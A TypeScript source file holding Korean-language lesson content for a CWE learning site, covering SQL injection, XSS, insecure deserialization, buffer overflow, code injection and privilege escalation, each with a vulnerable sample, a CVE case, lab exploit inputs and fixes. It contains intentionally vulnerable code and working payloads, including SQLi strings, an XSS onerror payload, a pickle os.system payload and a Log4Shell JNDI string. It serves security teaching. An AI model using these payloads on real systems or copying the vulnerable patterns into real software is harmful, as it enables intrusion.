// lib/curriculum.ts — CWE 학습 페이지 커리큘럼 5단계(개념·패턴·사례·재현·완화)의 강의 내용
export type LessonCode = {
  label: string
  nature: 'bad' | 'good' | 'other'
  language: string
  code: string
}

export type Lesson = {
  title: string
  summary: string
  points: string[]
  code?: LessonCode[]
}

const STEP_TITLES = [
  '개념과 발생 원리',
  '취약 코드 패턴 식별',
  '실제 CVE 사례 분석',
  '익스플로잇 재현',
  '완화 및 시큐어 코딩',
] as const

type LessonBody = Omit<Lesson, 'title'>

function build(steps: [LessonBody, LessonBody, LessonBody, LessonBody, LessonBody]): Lesson[] {
  return steps.map((step, i) => ({ title: STEP_TITLES[i], ...step }))
}

const LAB_NOTICE = '아래 실습은 직접 띄운 로컬 실습 환경에서만 진행하세요. 허가받지 않은 시스템에 시도하는 것은 불법입니다.'

const CURRICULUM: Record<string, Lesson[]> = {
  'CWE-89': build([
    {
      summary:
        '사용자 입력이 SQL 문의 "데이터"가 아니라 "문법"의 일부로 해석되면서 쿼리의 구조 자체가 바뀌는 취약점입니다. 원인은 대부분 쿼리를 문자열 연결로 만드는 데 있습니다.',
      points: [
        '원인: 입력값을 따옴표로 감싸 쿼리 문자열에 그대로 이어 붙임 → 입력 속 따옴표·주석 기호가 쿼리를 끊고 새 조건을 추가',
        '영향: 로그인 우회, 다른 사용자 데이터 조회·수정·삭제, DB 설정에 따라 파일 읽기나 OS 명령 실행까지 확장',
        'In-band: 결과가 화면에 바로 보임 (UNION 기반, 에러 메시지 기반)',
        'Blind: 결과는 안 보이지만 참/거짓 응답 차이(Boolean)나 응답 지연(Time)으로 한 글자씩 추출',
        'Out-of-band: DNS·HTTP 요청 등 다른 채널로 데이터를 빼냄',
      ],
    },
    {
      summary:
        '코드 리뷰에서는 "SQL 문자열을 만드는 지점에 외부 입력이 섞여 들어가는가"만 추적하면 대부분 찾을 수 있습니다.',
      points: [
        '문자열 연결(+)이나 템플릿 리터럴로 WHERE 절을 조립하는 코드',
        'ORDER BY, 테이블명, 컬럼명처럼 바인딩(?)이 불가능한 위치에 입력을 넣는 코드',
        'ORM을 쓰더라도 raw query / $queryRawUnsafe / .extra() 같은 우회 API를 쓰는 코드',
        'LIKE 검색, IN (...) 목록을 직접 만들어 붙이는 코드',
      ],
      code: [
        {
          label: '취약한 코드 — 입력을 쿼리 문자열에 직접 연결',
          nature: 'bad',
          language: 'javascript',
          code: `app.post('/login', async (req, res) => {
  const { id, pw } = req.body
  const sql = "SELECT * FROM users WHERE id = '" + id + "' AND pw = '" + pw + "'"
  const [rows] = await db.query(sql)
  if (rows.length > 0) return res.send('로그인 성공')
  res.status(401).send('실패')
})`,
        },
      ],
    },
    {
      summary:
        'CVE-2023-34362 (MOVEit Transfer) — 파일 전송 솔루션 MOVEit Transfer 웹 애플리케이션의 SQL Injection으로, 인증 없이 DB에 접근해 시스템을 장악할 수 있었습니다. CVSS 9.8.',
      points: [
        '2023년 5월 말부터 Cl0p 랜섬웨어 조직이 제로데이로 대량 악용',
        '공격자는 SQLi로 DB를 조작한 뒤 LEMURLOOT라는 웹셸(human2.aspx)을 설치해 저장된 파일을 탈취',
        '정부기관·대학·기업 등 수천 개 조직의 데이터가 유출된 대표적 공급망형 사고',
        '교훈: 외부에 노출된 관리형 소프트웨어 하나의 SQLi가 그 제품을 쓰는 모든 고객사 피해로 이어짐',
      ],
    },
    {
      summary: `${LAB_NOTICE} 위의 취약한 로그인 코드를 대상으로 쿼리 구조가 어떻게 바뀌는지 확인합니다.`,
      points: [
        "아이디 칸에 admin' -- 를 입력하면 뒤쪽 비밀번호 조건이 주석 처리됨",
        "' OR '1'='1 을 넣으면 WHERE 조건이 항상 참이 되어 첫 번째 계정으로 로그인됨",
        'ORDER BY 1, 2, 3 … 을 늘려 가며 에러가 나는 지점으로 컬럼 수를 파악 → UNION SELECT로 다른 테이블 조회',
        '확인 포인트: 서버 로그에 찍힌 최종 SQL 문을 직접 보면서 입력이 문법으로 바뀌는 순간을 관찰',
      ],
      code: [
        {
          label: "입력 admin' -- 가 들어갔을 때 실제로 실행되는 쿼리",
          nature: 'other',
          language: 'sql',
          code: `SELECT * FROM users WHERE id = 'admin' -- ' AND pw = '아무거나'
-- "--" 뒤가 전부 주석이 되어 비밀번호 검사가 사라짐`,
        },
      ],
    },
    {
      summary:
        '핵심은 Prepared Statement(파라미터 바인딩)입니다. 쿼리 구조를 먼저 확정하고 입력은 값으로만 전달하므로 따옴표가 들어와도 문법이 바뀌지 않습니다.',
      points: [
        '모든 값은 ? 또는 $1 플레이스홀더로 바인딩',
        '컬럼명·정렬 방향처럼 바인딩이 안 되는 부분은 허용 목록(allowlist)에서만 선택',
        'DB 계정은 최소 권한으로 (조회용 서비스에 DROP·FILE 권한 금지)',
        'DB 에러 메시지를 사용자에게 그대로 노출하지 않기',
        'WAF는 보조 수단일 뿐, 코드 수정을 대체하지 못함',
      ],
      code: [
        {
          label: '안전한 코드 — 파라미터 바인딩',
          nature: 'good',
          language: 'javascript',
          code: `const [rows] = await db.execute(
  'SELECT * FROM users WHERE id = ? AND pw_hash = ?',
  [id, hash(pw)],
)

const SORTABLE = ['created_at', 'name']
const column = SORTABLE.includes(req.query.sort) ? req.query.sort : 'created_at'`,
        },
      ],
    },
  ]),

  'CWE-79': build([
    {
      summary:
        '신뢰할 수 없는 입력이 이스케이프 없이 HTML에 출력되어, 공격자가 넣은 스크립트가 "피해자 브라우저에서, 해당 사이트의 권한으로" 실행되는 취약점입니다.',
      points: [
        'Reflected: URL 파라미터 등이 응답에 즉시 반사됨 → 피해자가 조작된 링크를 클릭해야 함',
        'Stored: 게시글·댓글처럼 DB에 저장된 뒤 열람하는 모든 사용자에게 실행됨 (가장 위험)',
        'DOM-based: 서버를 거치지 않고 클라이언트 JS가 location·hash 값을 DOM에 넣으면서 발생',
        '영향: 세션 탈취, 사용자 대신 요청 전송, 화면 위조(피싱), 키 입력 수집',
      ],
    },
    {
      summary: '"사용자 입력이 HTML·속성·JS·URL 중 어떤 문맥에 출력되는가"를 기준으로 찾습니다.',
      points: [
        'innerHTML, outerHTML, document.write, insertAdjacentHTML에 외부 값 대입',
        "React의 dangerouslySetInnerHTML, Vue의 v-html",
        "href / src 속성에 사용자 URL을 넣을 때 javascript: 스킴 검증 누락",
        '서버 템플릿에서 이스케이프를 끄는 문법 (EJS <%- %>, Jinja2 |safe, Thymeleaf th:utext)',
      ],
      code: [
        {
          label: '취약한 코드 — DOM 기반 XSS',
          nature: 'bad',
          language: 'javascript',
          code: `const name = new URLSearchParams(location.search).get('name')
document.querySelector('#greeting').innerHTML = '안녕하세요, ' + name + '님'`,
        },
      ],
    },
    {
      summary: '연결된 CVE 예시는 없지만, XSS가 얼마나 빠르게 퍼질 수 있는지 보여 주는 유명한 사례가 있습니다.',
      points: [
        'Samy 웜 (2005, MySpace): Stored XSS로 프로필을 본 사람의 프로필에 자신을 복제 → 약 20시간 만에 100만 명 이상 감염',
        'TweetDeck (2014): 트윗 본문이 이스케이프 없이 렌더링되어, 스크립트가 든 트윗을 보기만 해도 자동 리트윗되는 웜이 확산',
        '공통점: 저장형 XSS + 자기 복제 동작 → 사용자 상호작용 없이 폭발적으로 전파',
      ],
    },
    {
      summary: `${LAB_NOTICE} 위 DOM 기반 예제를 로컬에 띄우고 name 파라미터를 바꿔 가며 확인합니다.`,
      points: [
        '먼저 <b>test</b> 처럼 무해한 태그로 HTML이 해석되는지 확인',
        '<script>는 innerHTML로 넣으면 실행되지 않으므로 이벤트 핸들러를 사용',
        'alert(document.domain)으로 "어느 사이트 권한에서 실행됐는지" 증명하는 것이 표준 PoC',
        '출력 문맥이 속성 안이면 " 로 속성을 닫고, JS 문자열 안이면 \' 로 문자열을 닫는 식으로 문맥별 탈출 방식이 다름',
      ],
      code: [
        {
          label: '테스트 입력 예시',
          nature: 'other',
          language: 'text',
          code: `?name=<b>test</b>
?name=<img src=x onerror=alert(document.domain)>`,
        },
      ],
    },
    {
      summary:
        '출력하는 문맥에 맞는 인코딩이 기본이고, CSP와 HttpOnly 쿠키로 피해 범위를 줄입니다.',
      points: [
        '텍스트는 innerHTML 대신 textContent로 넣기 (React·Vue의 기본 {} 출력은 자동 이스케이프)',
        '꼭 HTML을 허용해야 하면 DOMPurify 같은 검증된 sanitizer 사용',
        'URL은 http/https 스킴만 허용',
        'Content-Security-Policy로 인라인 스크립트 차단 (script-src \'self\')',
        '세션 쿠키에 HttpOnly·Secure·SameSite 설정',
      ],
      code: [
        {
          label: '안전한 코드',
          nature: 'good',
          language: 'javascript',
          code: `document.querySelector('#greeting').textContent = '안녕하세요, ' + name + '님'

import DOMPurify from 'dompurify'
preview.innerHTML = DOMPurify.sanitize(userHtml)`,
        },
      ],
    },
  ]),

  'CWE-502': build([
    {
      summary:
        '직렬화된 바이트를 객체로 복원하는 과정에서, 공격자가 만든 데이터가 "어떤 클래스를 만들고 어떤 메서드를 호출할지"까지 결정하게 되는 취약점입니다.',
      points: [
        '역직렬화는 단순한 파싱이 아니라 객체 생성 + 특수 메서드(readObject, __reduce__, __wakeup 등) 호출을 동반',
        '가젯 체인(gadget chain): 앱에 이미 존재하는 라이브러리 클래스들을 연결해 최종적으로 명령 실행에 도달',
        '위험한 포맷: Java ObjectInputStream, Python pickle, PHP unserialize, .NET BinaryFormatter, YAML 전체 태그 로드',
        '영향: 대부분 원격 코드 실행(RCE), 그 외 인증 우회·DoS',
      ],
    },
    {
      summary: '외부(요청 본문·쿠키·캐시·메시지 큐)에서 들어온 바이트가 네이티브 역직렬화 함수로 들어가는지 확인합니다.',
      points: [
        'Java: new ObjectInputStream(...).readObject()',
        'Python: pickle.loads, yaml.load(..., Loader=yaml.Loader)',
        'PHP: unserialize($_COOKIE[...])',
        'Base64로 인코딩된 쿠키·hidden 필드 (Java는 rO0AB, pickle은 gASV 로 시작하는 경우가 많음)',
      ],
      code: [
        {
          label: '취약한 코드 — 요청 본문을 pickle로 복원',
          nature: 'bad',
          language: 'python',
          code: `import base64, pickle
from flask import request

@app.post('/restore')
def restore():
    session = pickle.loads(base64.b64decode(request.data))
    return f"복원 완료: {session['user']}"`,
        },
      ],
    },
    {
      summary:
        'CVE-2021-44228 (Log4Shell) — Apache Log4j 2가 로그 메시지 안의 ${jndi:...} 구문을 해석하면서, 공격자 서버에서 받은 객체를 로드해 원격 코드가 실행된 사건입니다. CVSS 10.0.',
      points: [
        'User-Agent, 검색어 등 "로그에 남는 아무 문자열"에 ${jndi:ldap://공격자서버/a} 를 넣기만 하면 트리거',
        'LDAP 응답으로 원격 클래스 위치나 직렬화된 객체를 돌려주면 서버가 이를 로드·역직렬화하며 코드 실행',
        '2021년 12월 공개 직후 전 세계적으로 대량 스캔·악용, Java 생태계 전반에 영향',
        '수정: 2.15.0에서 기본 비활성화 → 2.16.0에서 lookup 제거 → 2.17.1까지 연속 패치',
      ],
    },
    {
      summary: `${LAB_NOTICE} pickle이 복원 과정에서 함수를 호출한다는 사실을 직접 확인합니다.`,
      points: [
        '__reduce__는 "이 객체를 복원하려면 이 함수를 이 인자로 호출하라"는 지시를 직렬화 데이터에 담음',
        '아래 페이로드를 위 /restore 엔드포인트에 보내면 서버 프로세스 권한으로 id 명령이 실행됨',
        'Java는 ysoserial 같은 도구가 CommonsCollections 등 가젯 체인 페이로드를 생성해 줌',
        '확인 포인트: 응답이 에러여도 명령은 이미 실행됐다는 점 (복원 도중 실행되기 때문)',
      ],
      code: [
        {
          label: '실습용 페이로드 생성 (로컬 전용)',
          nature: 'other',
          language: 'python',
          code: `import base64, os, pickle

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())`,
        },
      ],
    },
    {
      summary: '가장 확실한 방법은 신뢰할 수 없는 데이터를 네이티브 역직렬화하지 않는 것입니다.',
      points: [
        '데이터 교환은 JSON 같은 "데이터 전용" 포맷 + 스키마 검증으로 대체',
        'Java: ObjectInputFilter(JEP 290)로 허용 클래스만 역직렬화',
        'Python: yaml.safe_load 사용, pickle은 내부 신뢰 데이터에만',
        '꼭 써야 한다면 HMAC 서명으로 위·변조 여부를 먼저 검증',
        'Log4j는 2.17.1 이상으로 업그레이드, 의존성 스캐너(SCA)로 취약 버전 탐지',
      ],
      code: [
        {
          label: '안전한 코드 — JSON + 검증',
          nature: 'good',
          language: 'python',
          code: `import json

@app.post('/restore')
def restore():
    data = json.loads(request.data)
    user = data.get('user')
    if not isinstance(user, str) or len(user) > 64:
        return '잘못된 요청', 400
    return f"복원 완료: {user}"`,
        },
      ],
    },
  ]),

  'CWE-787': build([
    {
      summary:
        '할당된 버퍼의 끝(또는 시작) 너머에 데이터를 쓰는 취약점입니다. C/C++처럼 경계 검사를 언어가 해 주지 않는 환경에서 주로 발생하며, 인접한 데이터·포인터·반환 주소를 덮어써 코드 실행으로 이어질 수 있습니다.',
      points: [
        'Stack overflow: 지역 배열을 넘쳐 저장된 반환 주소·카나리를 덮음',
        'Heap overflow: 힙 청크를 넘쳐 다음 객체의 필드나 함수 포인터를 덮음',
        'Off-by-one: <= 와 < 를 헷갈려 정확히 1바이트를 넘게 씀',
        '정수 오버플로로 할당 크기가 작게 계산된 뒤 원래 크기만큼 복사하는 경우도 흔함',
      ],
    },
    {
      summary: '"쓰는 길이"가 "버퍼 크기"와 독립적으로 결정되는 지점을 찾습니다.',
      points: [
        'strcpy, strcat, sprintf, gets 처럼 길이를 받지 않는 함수',
        'memcpy(dst, src, len)에서 len이 외부 입력(패킷 헤더, 파일 필드)에서 옴',
        '반복문 경계가 for (i = 0; i <= n; i++)',
        'malloc(count * size)에서 곱셈 오버플로 검사 누락',
      ],
      code: [
        {
          label: '취약한 코드 — 길이 검사 없는 복사',
          nature: 'bad',
          language: 'c',
          code: `void parse_name(const char *packet, size_t len) {
    char name[32];
    memcpy(name, packet, len);   /* len이 32보다 크면 스택 오버플로 */
    name[len] = '\\0';
    printf("hello %s\\n", name);
}`,
        },
      ],
    },
    {
      summary:
        'CVE-2023-4863 (libwebp) — WebP 이미지 디코더의 허프만 테이블 생성 과정(BuildHuffmanTable)에서 힙 버퍼 경계를 넘어 쓰는 취약점입니다. CVSS 8.8.',
      points: [
        '조작된 WebP 이미지를 열기만 해도 트리거 → 브라우저·메신저 등 이미지를 미리 보여 주는 모든 앱이 공격 표면',
        '실제 공격에 사용됨: iMessage 제로클릭 체인 BLASTPASS(Apple 측 CVE-2023-41064)와 같은 근본 원인',
        'Chrome 116.0.5845.187, Firefox, Electron 기반 앱 등 libwebp를 내장한 수많은 소프트웨어가 긴급 패치',
        '교훈: 널리 쓰이는 파서 라이브러리 하나의 메모리 버그가 생태계 전체로 퍼짐',
      ],
    },
    {
      summary: `${LAB_NOTICE} 여기서는 크래시를 재현하고 AddressSanitizer로 원인을 정확히 읽는 것까지를 목표로 합니다.`,
      points: [
        '위 parse_name 코드를 -fsanitize=address -g 옵션으로 컴파일',
        '32바이트보다 긴 입력을 넣으면 ASan이 stack-buffer-overflow와 함께 정확한 줄 번호를 출력',
        '리포트에서 "WRITE of size N"과 버퍼 경계 정보로 몇 바이트를 넘었는지 확인',
        'libFuzzer로 parse_name을 퍼징하면 이런 입력을 자동으로 찾아냄',
      ],
      code: [
        {
          label: '빌드와 실행',
          nature: 'other',
          language: 'bash',
          code: `clang -fsanitize=address -g overflow.c -o overflow
./overflow "$(python3 -c 'print("A" * 64)')"
# ==ERROR: AddressSanitizer: stack-buffer-overflow ... WRITE of size 64`,
        },
      ],
    },
    {
      summary: '모든 쓰기 전에 크기를 검사하고, 컴파일러·OS 보호 기법과 퍼징으로 남은 버그를 줄입니다.',
      points: [
        '복사 전 len <= sizeof(buf) - 1 검사, snprintf처럼 길이를 받는 함수 사용',
        '곱셈·덧셈 크기 계산은 __builtin_mul_overflow 등으로 오버플로 검사',
        '새 코드는 Rust 등 메모리 안전 언어 고려',
        '보호 기법: 스택 카나리(-fstack-protector-strong), ASLR, NX, CFI',
        'CI에 ASan + 퍼징(libFuzzer, OSS-Fuzz) 포함',
      ],
      code: [
        {
          label: '안전한 코드',
          nature: 'good',
          language: 'c',
          code: `void parse_name(const char *packet, size_t len) {
    char name[32];
    if (len >= sizeof(name)) return;   /* 경계 검사 */
    memcpy(name, packet, len);
    name[len] = '\\0';
    printf("hello %s\\n", name);
}`,
        },
      ],
    },
  ]),

  'CWE-94': build([
    {
      summary:
        '외부 입력이 프로그램 언어의 "코드"로 해석·실행되는 취약점입니다. OS 명령 인젝션과 달리 애플리케이션 언어(JS, Python, Java EL, 템플릿 엔진) 안에서 실행된다는 점이 특징입니다.',
      points: [
        'eval / exec / new Function 처럼 문자열을 코드로 실행하는 기능에 입력이 들어감',
        'SSTI(Server-Side Template Injection): 사용자 입력이 템플릿 "소스"로 쓰임',
        'Expression Language 인젝션: Spring SpEL, OGNL 등 표현식 평가',
        '영향: 서버 프로세스 권한으로 임의 코드 실행 → 파일 접근, 명령 실행, 내부망 이동',
      ],
    },
    {
      summary: '문자열을 코드나 템플릿으로 평가하는 함수 호출 지점에 외부 입력이 흘러드는지 추적합니다.',
      points: [
        'JS: eval(), new Function(), setTimeout("문자열"), vm.runInNewContext',
        'Python: eval(), exec(), Jinja2 render_template_string(사용자 입력)',
        'Java: SpEL parser.parseExpression(사용자 입력), 데이터 바인딩 대상 객체 제한 누락',
        '"계산기", "수식 필터", "커스텀 템플릿" 기능이 대표적인 의심 지점',
      ],
      code: [
        {
          label: '취약한 코드 — 계산기 기능에 eval 사용',
          nature: 'bad',
          language: 'javascript',
          code: `app.get('/calc', (req, res) => {
  const result = eval(req.query.expr)   // 예: expr=1+2
  res.send(String(result))
})`,
        },
      ],
    },
    {
      summary:
        'CVE-2022-22965 (Spring4Shell) — Spring Framework 데이터 바인딩이 요청 파라미터로 class.module.classLoader 경로에 접근하는 것을 막지 못해, Tomcat 설정을 조작하고 웹셸을 쓸 수 있었던 취약점입니다. CVSS 9.8.',
      points: [
        '조건: JDK 9 이상 + Spring MVC/WebFlux + Tomcat에 WAR로 배포',
        '공격자는 파라미터로 Tomcat AccessLogValve의 경로·패턴을 바꿔 로그 파일 대신 JSP 웹셸을 생성',
        '과거 CVE-2010-1622의 차단 로직이 JDK 9의 Module API(class.module) 경로로 우회됨',
        '수정: Spring Framework 5.3.18 / 5.2.20, Tomcat 측에서도 방어 패치',
      ],
    },
    {
      summary: `${LAB_NOTICE} 위 계산기 예제로 입력이 코드로 실행되는 것을 확인합니다.`,
      points: [
        '정상 입력 1+2 → 3, 7*7 → 49 로 수식이 평가되는지 확인',
        '수식 대신 JS 코드를 넣으면 그대로 실행됨 → process.version 으로 Node 버전 노출 확인',
        'SSTI 탐지는 {{7*7}} 을 넣고 49가 출력되는지로 시작 (템플릿 엔진마다 문법이 다름)',
        '확인 포인트: 응답 값뿐 아니라 서버 쪽 부수 효과(파일 생성 등)가 생기는지 관찰',
      ],
      code: [
        {
          label: '테스트 입력 예시',
          nature: 'other',
          language: 'text',
          code: `/calc?expr=7*7
/calc?expr=process.version`,
        },
      ],
    },
    {
      summary: '입력을 코드로 평가하지 않는 것이 원칙입니다. 필요한 기능은 제한된 파서로 구현합니다.',
      points: [
        'eval·new Function 사용 금지 (ESLint no-eval 규칙으로 강제)',
        '수식 계산은 숫자·연산자만 허용하는 파서 라이브러리 사용 (예: expr-eval의 제한 모드, 직접 만든 AST 파서)',
        'Node의 vm 모듈은 보안 경계가 아님 — 샌드박스로 믿지 말 것',
        '템플릿은 고정 파일로 두고 사용자 입력은 변수로만 전달',
        'Spring: 최신 버전 유지, @InitBinder로 바인딩 허용 필드 제한',
      ],
      code: [
        {
          label: '안전한 코드 — 허용된 문자만 받아 직접 계산',
          nature: 'good',
          language: 'javascript',
          code: `app.get('/calc', (req, res) => {
  const m = /^(-?\\d+(?:\\.\\d+)?)\\s*([+\\-*/])\\s*(-?\\d+(?:\\.\\d+)?)$/.exec(req.query.expr ?? '')
  if (!m) return res.status(400).send('숫자 연산자 숫자 형식만 지원')
  const [a, op, b] = [Number(m[1]), m[2], Number(m[3])]
  const ops = { '+': a + b, '-': a - b, '*': a * b, '/': a / b }
  res.send(String(ops[op]))
})`,
        },
      ],
    },
  ]),

  'CWE-269': build([
    {
      summary:
        '권한을 부여·확인·해제하는 과정이 잘못되어, 사용자나 프로세스가 의도보다 높은 권한을 얻거나 유지하게 되는 취약점입니다.',
      points: [
        '권한 상승(Privilege Escalation): 일반 사용자 → 관리자, 컨테이너 → 호스트, 사용자 → root',
        '권한을 너무 많이 줌: 서비스가 root로 동작, 모든 API가 관리자 토큰 사용',
        '권한을 내려놓지 않음: setuid 프로그램이 작업 후에도 root 권한 유지',
        '권한을 클라이언트가 정함: 요청 본문의 role 값을 서버가 그대로 신뢰',
      ],
    },
    {
      summary: '"권한 값이 어디서 오는지"와 "권한 변경 후 결과를 확인하는지"를 봅니다.',
      points: [
        '요청 본문을 통째로 사용자 객체에 병합 (Mass Assignment)',
        'setuid() / setgid() 반환값을 검사하지 않음',
        '관리자 API에서 로그인 여부만 확인하고 역할(role) 검사를 생략',
        'Dockerfile에 USER 지시어가 없어 컨테이너가 root로 실행',
      ],
      code: [
        {
          label: '취약한 코드 — 요청 본문을 그대로 병합',
          nature: 'bad',
          language: 'javascript',
          code: `app.patch('/me', requireLogin, async (req, res) => {
  const user = await User.findById(req.user.id)
  Object.assign(user, req.body)   // role, isAdmin 까지 덮어쓸 수 있음
  await user.save()
  res.json(user)
})`,
        },
      ],
    },
    {
      summary:
        'CVE-2022-0847 (Dirty Pipe) — 리눅스 커널 5.8부터 존재한 버그로, 일반 사용자가 읽기 전용 파일의 페이지 캐시를 덮어써 root 권한을 얻을 수 있었습니다. CVSS 7.8.',
      points: [
        '원인: 파이프 버퍼를 새로 만들 때 flags 필드를 초기화하지 않아 PIPE_BUF_FLAG_CAN_MERGE가 남아 있었음',
        'splice()로 파일 페이지를 파이프에 연결한 뒤 write하면, 쓰기 권한이 없는 파일 내용이 메모리상에서 바뀜',
        '/etc/passwd 수정이나 setuid 바이너리 덮어쓰기로 root 획득, Android 일부 기기도 영향',
        'Max Kellermann이 발견, 5.16.11 / 5.15.25 / 5.10.102에서 수정',
      ],
    },
    {
      summary: `${LAB_NOTICE} 웹 애플리케이션의 Mass Assignment로 권한이 바뀌는 과정을 재현합니다.`,
      points: [
        '일반 계정으로 로그인 후 GET /me 로 현재 role이 user인지 확인',
        'PATCH /me 요청 본문에 이름과 함께 role 필드를 추가해 전송',
        '다시 GET /me 를 호출해 role이 admin으로 바뀌었는지, 관리자 API가 열리는지 확인',
        '커널 취약점(Dirty Pipe)은 패치되지 않은 커널의 격리된 VM에서만 uname -r 로 버전을 확인한 뒤 학습',
      ],
      code: [
        {
          label: '요청 예시',
          nature: 'other',
          language: 'http',
          code: `PATCH /me HTTP/1.1
Content-Type: application/json

{"name": "student", "role": "admin"}`,
        },
      ],
    },
    {
      summary: '최소 권한 원칙을 기본으로, 권한 결정은 항상 서버가 하고 권한 변경 결과를 검증합니다.',
      points: [
        '수정 가능한 필드만 허용 목록으로 골라서 반영',
        '모든 관리자 기능에서 서버 측 역할 검사 (인증 ≠ 인가)',
        'setuid 프로그램은 필요한 작업 직후 권한을 내리고 반환값 확인',
        '컨테이너는 non-root USER, 불필요한 capabilities 제거',
        '커널·OS 보안 업데이트를 빠르게 적용',
      ],
      code: [
        {
          label: '안전한 코드 — 허용 필드만 반영',
          nature: 'good',
          language: 'javascript',
          code: `const EDITABLE = ['name', 'bio']

app.patch('/me', requireLogin, async (req, res) => {
  const updates = Object.fromEntries(
    Object.entries(req.body).filter(([key]) => EDITABLE.includes(key)),
  )
  const user = await User.findByIdAndUpdate(req.user.id, updates, { new: true })
  res.json(user)
})`,
        },
      ],
    },
  ]),
}

export function getCurriculum(cweId: string): Lesson[] {
  return CURRICULUM[cweId.toUpperCase()] ?? STEP_TITLES.map((title) => ({ title, summary: '', points: [] }))
}
